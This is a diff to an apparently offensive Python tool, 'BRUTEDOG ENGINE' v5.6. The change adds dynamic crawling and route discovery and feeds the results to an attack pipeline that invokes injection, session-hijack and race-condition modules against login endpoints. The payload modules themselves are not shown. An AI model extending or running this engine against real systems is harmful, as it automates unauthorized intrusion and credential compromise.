@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG ENGINE v5.5 — High-Aggression Adaptive Exploitation & Concurrency Engine
+BRUTEDOG ENGINE v5.6 — High-Aggression Dynamic Crawling & Exploitation Engine
 Features:
+- Dynamic web crawling & API route discovery via crawler module
 - Interactive target selection & automated resolution
 - Stateful, adaptive response-parsing and payload mutation loop
 - Aggressive NoSQL/SQL time-based blind injection & data extraction
@@ -24,6 +25,7 @@ from urllib.parse import urlsplit
 from concurrent.futures import ThreadPoolExecutor
 
 # Import weaponized offensive modules
+from modules.crawler import crawl_target
 from modules.db_assault import run_nosql_assault
 from modules.session_hijack import run_session_hijack
 from modules.race_condition import run_race_condition_test
@@ -34,9 +36,9 @@ from modules.race_condition import run_race_condition_test
 REQUEST_TIMEOUT = 8
 MAX_WORKERS = 5
 MAX_RESPONSE_SIZE = 200_000
-USER_AGENT = "BruteDog-Offensive-Engine/5.5"
+USER_AGENT = "BruteDog-Offensive-Engine/5.6"
 
-LOGIN_PATHS = [
+FALLBACK_LOGIN_PATHS = [
     "/api/auth/callback/credentials",
     "/api/auth/login",
     "/api/auth/signin",
@@ -232,7 +234,7 @@ def classify_and_adapt(response, current_payload):
 # ACTIVE ADAPTIVE ENDPOINT TESTING
 # ============================================================
 def test_endpoint(host, port, base_path, path, secure, credentials_list=None):
-    endpoint = f"{base_path}{path}" or "/"
+    endpoint = f"{base_path}{path}" if not path.startswith(base_path) else path
     info(f"Targeting endpoint (Adaptive Mode): {endpoint}")
     results = []
     
@@ -283,7 +285,7 @@ def test_endpoint(host, port, base_path, path, secure, credentials_list=None):
 # ENGINE ORCHESTRATOR
 # ============================================================
 async def run_autonomous_engine(target_host=None, credentials_list=None, options=None):
-    section("BRUTEDOG ADAPTIVE OFFENSIVE EXPLOITATION ENGINE v5.5")
+    section("BRUTEDOG ADAPTIVE OFFENSIVE EXPLOITATION ENGINE v5.6")
     try:
         if target_host:
             target = target_host.strip()
@@ -318,6 +320,17 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     start = time.monotonic()
     target_url = f"{protocol.lower()}://{host}:{port}{base_path}"
     
+    # 0. Dynamic Web Crawling & Route Discovery
+    section("DYNAMIC ENDPOINT CRAWLING & RECON")
+    try:
+        discovered_paths = crawl_target(target_url)
+    except Exception as exc:
+        warning(f"Crawler encountered an issue: {exc}. Falling back to default list.")
+        discovered_paths = []
+
+    if not discovered_paths:
+        discovered_paths = FALLBACK_LOGIN_PATHS
+
     section("ADAPTIVE ENDPOINT TESTING & MUTATION ASSAULT")
     all_results = []
     semaphore = asyncio.Semaphore(MAX_WORKERS)
@@ -328,7 +341,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
                 test_endpoint, host, port, base_path, path, secure, credentials_list
             )
             
-    tasks = [asyncio.create_task(worker(path)) for path in LOGIN_PATHS]
+    tasks = [asyncio.create_task(worker(path)) for path in discovered_paths]
     
     for completed in asyncio.as_completed(tasks):
         try:
@@ -348,7 +361,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     try:
         await run_session_hijack(target_url, port=port, use_ssl=secure)
     except Exception as exc:
-        error(f"Session hijack failed: {exc})
+        error(f"Session hijack failed: {exc}")
 
     # 3. High-Concurrency Race Condition & Logic Fuzzing
     try:
@@ -362,7 +375,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     tested = len(all_results)
     potential = sum(len(item["findings"]) for item in all_results)
     success(f"Target: {host}")
-    success(f"Endpoints scanned: {len(LOGIN_PATHS)}")
+    success(f"Discovered/Scanned endpoints: {len(discovered_paths)}")
     success(f"Total adaptive requests executed: {tested}")
     success(f"Vulnerability / Exploitation hits: {potential}")
     success(f"Engine duration: {duration}s")
